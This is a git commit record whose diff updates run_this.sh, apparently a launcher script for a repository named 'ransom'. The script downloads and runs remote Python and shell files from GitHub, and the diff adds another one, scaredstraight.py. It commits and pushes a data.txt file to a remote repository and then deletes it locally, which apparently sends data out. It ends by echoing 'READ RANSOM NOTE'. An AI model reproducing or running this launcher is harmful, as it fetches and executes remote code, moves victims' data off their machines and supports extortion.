6f889d00cf554f78f4f0113c0020aa4b1536a54d
samsepi0lw <147035842+samsepi0lw@users.noreply.github.com>
2023-10-11 11:08:28 +0000

    Update run_this.sh

--- run_this.sh
+++ run_this.sh
@@ -1,7 +1,9 @@
 wget https://github.com/samsepi0lw/ransom/blob/main/monsterwith23faces.py?raw=true
 wget https://github.com/samsepi0lw/ransom/blob/main/after_ransom_is_given_run_this.sh?raw=true
+wget https://github.com/samsepi0lw/ransom/blob/main/scaredstraight.py?raw=true
 mv monsterwith23faces.py\?raw=true monsterwith23faces.py
 mv after_ransom_is_given_run_this.sh\?raw=true after_ransom_is_given_run_this.sh
+mv scaredstraight.py?raw=true scaredstraight.py
 clear
 #!/bin/bash
 python monsterwith23faces.py
@@ -15,6 +17,7 @@ git add ./data.txt
 git commit -m "Uploaded data file"
 git push origin master
 rm ./data.txt
+python scaredstraight.py
 clear
 echo "READ RANSOM NOTE"
 echo "READ RANSOM NOTE"
